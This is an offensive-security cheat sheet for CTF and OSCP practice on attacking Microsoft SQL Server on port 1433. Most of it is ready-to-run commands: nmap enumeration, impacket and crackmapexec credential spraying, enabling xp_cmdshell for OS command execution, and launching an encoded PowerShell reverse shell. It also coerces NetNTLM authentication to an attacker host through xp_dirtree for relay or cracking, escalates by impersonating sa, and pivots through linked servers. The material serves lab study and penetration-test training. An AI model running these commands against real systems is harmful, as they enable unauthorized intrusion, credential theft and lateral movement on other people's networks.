---
tags: [hacking, ctf, oscp, mssql, database, windows]
type: cheatsheet
source: compiled reference (MSSQL enumeration)
last-verified: 2026-09-02
---

# MSSQL (1433)

## Up
- [[Services]]

Microsoft SQL Server. A frequent **Windows foothold**: with `sa`/weak creds you often get **command execution** via `xp_cmdshell`, plus impersonation and relay tricks. Language reference: [[MSSQL]]/[[T-SQL]] (Coding/SQL).

---

## Enumerate

```bash
nmap -p1433 -sC -sV $IP
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-ntlm-info -p1433 $IP

# connect (impacket is the CTF favourite)
impacket-mssqlclient sa:'Password!'@$IP
impacket-mssqlclient CORP/user:pass@$IP -windows-auth
crackmapexec mssql $IP -u sa -p pass                 # spray/validate
```

---

## Foothold Techniques (RCE)

```sql
-- enable + use xp_cmdshell (as sa / high-priv)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -e <base64 reverse shell>';
```
```text
# impacket-mssqlclient shortcuts:
enable_xp_cmdshell
xp_cmdshell whoami
# capture/relay NetNTLM by forcing the service account to auth to you:
exec master..xp_dirtree '\\LHOST\share'      # → Responder / ntlmrelayx → crack/relay
```

```sql
-- impersonation (privilege escalation within SQL)
SELECT distinct b.name FROM sys.server_permissions a
  INNER JOIN sys.server_principals b ON a.grantor_principal_id=b.principal_id
  WHERE a.permission_name='IMPERSONATE';
EXECUTE AS LOGIN='sa'; SELECT SYSTEM_USER;    -- become sa → xp_cmdshell
-- linked servers → pivot / execute on another SQL host
EXEC sp_linkedservers;  SELECT * FROM OPENQUERY("LINKED", 'select @@version');
```

---

## Common Misconfigurations / Exploits

- **`sa` with weak/blank password**, or SQL auth creds reused from web.
- **`xp_cmdshell`** available (or enable-able as sa) → OS command exec → often SYSTEM (service runs high).
- **`xp_dirtree`/`xp_subdirs`** → coerce **NetNTLM** auth to you → relay/crack ([[Password Cracking]]).
- **Impersonation** (`IMPERSONATE` grants) → become sa.
- **Linked servers** with saved creds → lateral movement / RCE on other DB hosts.

---

## OSCP Tips

- The MSSQL **service account often has `SeImpersonatePrivilege`** → `xp_cmdshell` shell → **potato** → SYSTEM (see [[Windows PrivEsc]]).
- Use **impacket-mssqlclient** (`enable_xp_cmdshell`, `xp_cmdshell`) — smoothest path.
- No xp_cmdshell rights? Try **impersonation** or **xp_dirtree relay**.
- Reuse any creds on [[SMB (139,445)]]/[[WinRM (5985,5986)]]/[[Active Directory]].
